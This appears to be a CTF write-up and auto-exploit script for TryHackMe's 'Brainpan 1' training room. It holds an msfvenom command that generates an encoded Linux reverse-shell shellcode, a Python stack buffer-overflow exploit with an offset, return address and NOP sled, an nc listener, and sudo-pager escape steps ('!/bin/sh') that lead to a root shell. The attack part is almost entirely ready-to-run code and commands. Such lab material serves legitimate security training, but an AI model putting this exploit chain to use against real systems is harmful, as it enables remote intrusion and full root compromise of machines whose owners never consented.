# TryHackMe's "Brainpan 1" room (https://tryhackme.com/room/brainpan).

# First of all create your shellcode for linux with:
(msfvenom -p linux/x86/  shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00")
# Introduce the shellcode in the payload.

```
import socket
import subprocess
import time



print ("Autopwnd TryHackMe's Brainpan 1 room (https://tryhackme.com/room/brainpan).")
print ("Please first of all read README.md(https://github.com/Kalugh/Autopwn-Brainpan-1/blob/main/README.md)")
victim = input("Enter your ip you want to attack:")

ip = victim
port = 9999

#badchars = \x00

#Return Direcction (0x311712f3)

prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = ""
payload = "\x41" * 520
payload += retn
payload += "\x90" * 30
payload += (ENTER YOUR SHELLCODE HERE)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

command = "nc -nvlp 4444" # Chage this if you change the port doing your shellcode introduced on payload
subprocess.call(command, shell=True)
```
# Privilege Escalation
Now you are in the linux machine called "puck(puck@brainpan:/home/puck$)"

You need to run just 3 commands in this order:

1st. python3 -c "import pty; pty.spawn('/bin/bash');"

2nd. sudo /home/anansi/bin/anansi_util manual ls
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)  
```
3rd. Don't press RETURN just execute: !/bin/sh

Just like this:
```
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!bin/sh
```
After that you should see something like this:
```
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh
!/bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
